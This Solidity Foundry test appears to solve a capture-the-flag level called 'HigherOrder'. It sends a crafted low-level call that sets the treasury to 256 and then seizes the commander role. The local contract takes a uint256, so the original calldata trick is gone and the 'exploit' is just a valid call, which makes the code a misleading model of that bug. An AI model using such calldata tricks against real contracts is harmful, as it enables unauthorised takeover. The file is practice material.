// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract HigherOrder {
    address public commander;
    uint256 public treasury;

    function registerTreasury(uint256 _treasury) public {
        assembly {
            sstore(treasury.slot, _treasury)
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Must be higher than 255");
    }
}

contract HigherOrderTest is Test {
    HigherOrder levelInstance;

    function testLevel30_HigherOrder_Local() public {
        levelInstance = new HigherOrder();
        
        bytes memory payload = abi.encodeWithSignature(
            "registerTreasury(uint256)", 
            uint256(256) 
        );

        (bool success, ) = address(levelInstance).call(payload);
        require(success, "Call failed");

        levelInstance.claimLeadership();
        
        assertEq(levelInstance.commander(), address(this));
        
        console.log("Success! Commander is:", levelInstance.commander());
        console.log("Treasury Value:", levelInstance.treasury());
    }
}